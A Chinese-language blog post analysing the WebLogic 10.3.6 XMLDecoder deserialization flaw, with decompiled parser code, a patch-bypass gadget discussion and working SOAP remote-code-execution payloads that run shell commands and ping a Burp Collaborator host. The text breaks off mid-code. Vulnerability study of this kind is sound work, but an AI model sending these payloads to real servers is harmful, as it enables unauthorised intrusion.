<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="robots" content="index, follow"><title>weblogic 10.3.6 XMLDecoder 反序列化漏洞学习 • Hexo</title><meta name="description" content="weblogic 10.3.6 XMLDecoder 反序列化漏洞学习 - John Doe"><link rel="icon" href="https://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/23295562.jpeg"><link rel="stylesheet" href="https://unpkg.com/nanoreset@3.0.1/nanoreset.min.css"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hexo"><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head><body><div class="wrap" id="barba-wrapper"><header><h1 class="branding"><a href="/" title="Hexo"><img class="logo-image" src="https://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/23295562.jpeg" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link no-barba" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/about" target="_self">ABOUT</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="/links" target="_self">LINKS</a></li><li class="nav-list-item"><a class="nav-list-link no-barba" href="https://github.com/l0ca1" target="_blank">GITHUB</a></li></ul></header><div class="barba-container"><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">weblogic 10.3.6 XMLDecoder 反序列化漏洞学习</h1><div class="post-info"><a></a>2020-07-07</div><div class="post-content"><p>文章整体学习于 <a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704" target="_blank" rel="noopener">奇安信 WebLogic 安全研究报告</a></p>
<h2 id="sax-解析-xml-基础"><a href="#sax-解析-xml-基础" class="headerlink" title="sax 解析 xml 基础"></a>sax 解析 xml 基础</h2><p>java 在使用 sax 处理 xml 时，采用事件进行处理，那我们我们需要关注有哪些事件。<br>事件源有 4 种：ContentHandler,DTDHandler,ErrorHandler,以及 EntityResolver。<br>处理内容的事件源是 ContentHandler，看一下他的事件（<a href="http://www.saxproject.org/apidoc/org/xml/sax/ContentHandler.html" target="_blank" rel="noopener">截图来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd02.png" alt="396790baee89469ea39fea0cf604cfd02"><br><a href="https://www.ibm.com/developerworks/cn/xml/x-saxhandle/index.html" target="_blank" rel="noopener">中文文档</a><br>引用一张图（<a href="https://xz.aliyun.com/t/5069" target="_blank" rel="noopener">来源</a>）：<br><img src="http://l0ca1-blog.oss-cn-beijing.aliyuncs.com/imgs/396790baee89469ea39fea0cf604cfd01.png" alt="396790baee89469ea39fea0cf604cfd01"><br>根据头部文章的说明及其调试，xml 反序列化流程会先进入 DocumentHandler，对各类事件源进行处理，同时在处理的过程中再分发到相关的标签 ElementHandler。看一下 DocumentHandler 的处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据标签添加各种标签ElementHandler。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DocumentHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"java"</span>, JavaElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"null"</span>, NullElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="keyword">this</span>.setElementHandler(<span class="string">"array"</span>, ArrayElementHandler<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//开始解析各种标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String var1, String var2, String var3, Attributes var4)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">        <span class="comment">//保存上一级ElementHandler对象，通过setParent保存在this.parent中</span></span><br><span class="line">				ElementHandler var5 = <span class="keyword">this</span>.handler;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="comment">//根据标签名，通过getElementHandler获取保存的各类ElementHandler。</span></span><br><span class="line">            <span class="keyword">this</span>.handler = (ElementHandler)<span class="keyword">this</span>.getElementHandler(var3).newInstance();</span><br><span class="line">            <span class="keyword">this</span>.handler.setOwner(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">this</span>.handler.setParent(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SAXException(var10);</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">//遍历各类属性，通过addAttribute进行保存设置。</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var4.getLength(); ++var6) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="comment">//获取属性名字和属性值。</span></span><br><span class="line">                String var7 = var4.getQName(var6);</span><br><span class="line">                String var8 = var4.getValue(var6);</span><br><span class="line">                <span class="keyword">this</span>.handler.addAttribute(var7, var8);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">                <span class="keyword">this</span>.handleException(var9);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">//调用ElementHandler的startElement。</span></span><br><span class="line">        <span class="keyword">this</span>.handler.startElement();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//结束标签解析</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">(String var1, String var2, String var3)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//直接调用ElementHandler的endElement</span></span><br><span class="line">            <span class="keyword">this</span>.handler.endElement();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var8) &#123;</span><br><span class="line">            <span class="keyword">this</span>.handleException(var8);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.handler = <span class="keyword">this</span>.handler.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>object 标签和 void 标签基本都是 ObjectElementHandler 处理的，ObjectElementHandler 继承于 NewElementHandler，他的特点是可以保存 argument 和 type 值，argument 为保存的参数，type 为当前的对象。分析一下 ObjectElemtHandler 的 getValueObject:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.field != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(<span class="keyword">this</span>.getContextBean(), <span class="keyword">this</span>.field));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.idref != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(<span class="keyword">this</span>.getVariable(<span class="keyword">this</span>.idref));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//获取上下文环境，如果当前对象设置了type值，则上下文环境为type设置的对象，如果没有设置，</span></span><br><span class="line"><span class="comment">//则取上一层标签的值对象作为上下文环境，及调用上一层的getValueObject()</span></span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.index != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">2</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.property != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var4 = var2.length == <span class="number">1</span> ? <span class="string">"set"</span> : <span class="string">"get"</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="keyword">this</span>.property.length()) &#123;</span><br><span class="line">                    var4 = var4 + <span class="keyword">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + <span class="keyword">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//expression是一个反射封装，var3为object，var4为method，var2为arguments。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再看一下 ElementHandler 的 endElement 方法，只要处理标签没有重写 endElement，都会默认调用 ElementHandler 的这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">endElement</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//获取当前标签的值。</span></span><br><span class="line">        ValueObject var1 = <span class="keyword">this</span>.getValueObject();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isVoid()) &#123;</span><br><span class="line"><span class="comment">//设置为环境变量值？？？</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.id != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.owner.setVariable(<span class="keyword">this</span>.id, var1.getValue());</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//是否作为参数值进行传递。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.isArgument()) &#123;</span><br><span class="line"><span class="comment">//说明如果可以作为参数进行传递且存在上一层标签，则上一层必须支持参数传递。</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parent.addArgument(var1.getValue());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.owner.addObject(var1.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="POC1-分析"><a href="#POC1-分析" class="headerlink" title="POC1 分析"></a>POC1 分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/wls-wsat/CoordinatorPortType</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">      &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">          &lt;java&gt;</span><br><span class="line">            &lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">              &lt;array <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"0"</span>&gt;</span><br><span class="line">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"1"</span>&gt;</span><br><span class="line">                  &lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">                &lt;<span class="keyword">void</span> index=<span class="string">"2"</span>&gt;</span><br><span class="line">                  &lt;string&gt;ping l0ca1.0hi1213pu5qcednmhhch7a8x5obez3.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">                &lt;/void&gt;</span><br><span class="line">              &lt;/array&gt;</span><br><span class="line">              &lt;<span class="keyword">void</span> method=<span class="string">"start"</span>/&gt;</span><br><span class="line">            &lt;/object&gt;</span><br><span class="line">          &lt;/java&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">      &lt;/soapenv:Header&gt;</span><br><span class="line">      &lt;soapenv:Body/&gt;</span><br><span class="line">    &lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源：https://www.03sec.com/3211.shtml</span></span><br><span class="line"><span class="comment">//&lt;java&gt;标签可以去除</span></span><br></pre></td></tr></table></figure>

<p>这里创建 ProcessBuilder 是通过<code>&lt;object&gt;</code>标签加上属性 class 去创建的。ProcessBuilder 的 common 参数是通过 array 标签去传递的，调用 start 方法是通过<code>&lt;void method=&quot;start&quot;&gt;</code>去调用的。<code>&lt;array&gt;</code>标签会首先通过 Array.newInstance(“java.lang.String”,3)创建 array，然后通过 void 配合 index 值即<code>&lt;void index=&quot;&quot;&gt;</code>，在每次 void 标签结束时，获取 array 标签的值，即创建的 Array，然后调用 set 方法进行添加值。在 array 标签结束后，将最终的 array 通过参数设置，设置给 object 标签对象的 argument 属性中，最后在<code>&lt;void method=&quot;start&quot;&gt;</code>的时候，进行反射调用。<br>根据分析，poc 可以进行一些小改动。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;object <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;<span class="keyword">void</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;<span class="keyword">new</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">这三个都可以返回一个具体对象 而&lt;<span class="class"><span class="keyword">class</span>&gt;标签只能返回一个<span class="title">Class</span>对象</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">void</span> <span class="title">method</span></span>=<span class="string">"start"</span>/&gt;</span><br><span class="line">可以替换为</span><br><span class="line">&lt;method name=<span class="string">"start"</span>/&gt;</span><br><span class="line"></span><br><span class="line">应该是有很多变种，比如利用静态方法获取Object</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">        &lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"getRuntime"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"java.lang.Runtime"</span>&gt;</span><br><span class="line">            &lt;method name=<span class="string">"exec"</span>&gt;</span><br><span class="line">            &lt;string&gt;ping ccc.d4ihrpfqecs5p7tzf88c21i0qrwhk6.burpcollaborator.net&lt;/string&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">            &lt;/method&gt;</span><br><span class="line">        &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body /&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<h2 id="POC2-分析"><a href="#POC2-分析" class="headerlink" title="POC2 分析"></a>POC2 分析</h2><p>这个是跟据这篇<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>做的笔记</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入口：/_async/AsyncResponseService</span></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:wsa=<span class="string">"http://www.w3.org/2005/08/addressing"</span> xmlns:balisong=<span class="string">"http://www.bea.com/async/AsyncResponseService"</span>&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;test&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">xxxxxx</span>&lt;<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">void</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;balisong:onAsyncDelivery&gt;calculator&lt;/balisong:onAsyncDelivery&gt;</span><br><span class="line">     &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"><span class="comment">//来源 http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi</span></span><br></pre></td></tr></table></figure>

<p>根据文章补丁截图，不允许使用 object、new、method 标签，void 的标签只允许 index 属性出现。结合上面的 poc1，是没有办法直接反射调用类方法类了。<br>因为存在 class 标签，可以返回一个 Class 对象，同时 void 还可以使用，所以是可以通过反射完成初始化类的。完成过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassElementHandler</span> <span class="keyword">extends</span> <span class="title">StringElementHandler</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getOwner().findClass(var1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ObjectElementHandler</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title">getValueObject</span><span class="params">(Class&lt;?&gt; var1, Object[] var2)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">       .....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var3 = <span class="keyword">this</span>.getContextBean();</span><br><span class="line">            String var4;</span><br><span class="line">            ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = <span class="keyword">this</span>.method != <span class="keyword">null</span> &amp;&amp; <span class="number">0</span> &lt; <span class="keyword">this</span>.method.length() ? <span class="keyword">this</span>.method : <span class="string">"new"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//默认为new方法，Expression在封装中，将new转变为newInstance，完成class的初始化。无参通过Class.newInstance,</span></span><br><span class="line"><span class="comment">//有参通过Constructor.newInstance。</span></span><br><span class="line">            Expression var5 = <span class="keyword">new</span> Expression(var3, var4, var2);</span><br><span class="line">            <span class="keyword">return</span> ValueObjectImpl.create(var5.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Expression</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//无参构造与有参构造</span></span><br><span class="line">	<span class="keyword">if</span> (methodName.equals(<span class="string">"new"</span>)) &#123;</span><br><span class="line">      methodName = <span class="string">"newInstance"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">if</span> (methodName.equals(<span class="string">"newInstance"</span>) &amp;&amp; arguments.length != <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (target == Character<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">arguments</span>.<span class="title">length</span> </span>== <span class="number">1</span> &amp;&amp;</span><br><span class="line">	        argClasses[<span class="number">0</span>] == String<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">	        <span class="keyword">return</span> <span class="keyword">new</span> Character(((String)arguments[<span class="number">0</span>]).charAt(<span class="number">0</span>));</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">try</span> &#123;</span><br><span class="line">	        m = ConstructorFinder.findConstructor((Class)target, argClasses);</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">catch</span> (NoSuchMethodException exception) &#123;</span><br><span class="line">	        m = <span class="keyword">null</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">....</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (m <span class="keyword">instanceof</span> Method) &#123;</span><br><span class="line">          <span class="keyword">return</span> MethodUtil.invoke((Method)m, target, arguments);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> ((Constructor)m).newInstance(arguments);</span><br><span class="line">      &#125;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<p>既然还可以调用构造函数，那么就需要寻找构造函数中存在恶意操作的类。</p>
<h3 id="POC2-UnitOfWorkChangeSet"><a href="#POC2-UnitOfWorkChangeSet" class="headerlink" title="POC2-UnitOfWorkChangeSet"></a>POC2-UnitOfWorkChangeSet</h3><p>这个是从参考<a href="http://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi" target="_blank" rel="noopener">文章</a>中选出来学习的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">UnitOfWorkChangeSet</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteIn = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectIn = <span class="keyword">new</span> ObjectInputStream(byteIn);</span><br><span class="line">        <span class="keyword">this</span>.allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">        <span class="keyword">this</span>.deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>他的这个构造函数中，通过 bytes 完成了反序列化。所以利用 UnitOfWorkChangeSet 可以完成二次反序列化利用。后续就是利用链的问题。这里试了一下 URLDNS。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> result string</span><br><span class="line">	filename := <span class="string">"/tmp/test.bin"</span></span><br><span class="line">	<span class="keyword">var</span> fileContentsBytes []<span class="keyword">byte</span></span><br><span class="line">	<span class="keyword">var</span> err error</span><br><span class="line">	<span class="keyword">if</span> fileContentsBytes, err = ioutil.ReadFile(filename); err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	result = fmt.Sprintf(<span class="string">"&lt;array class=\"byte\" 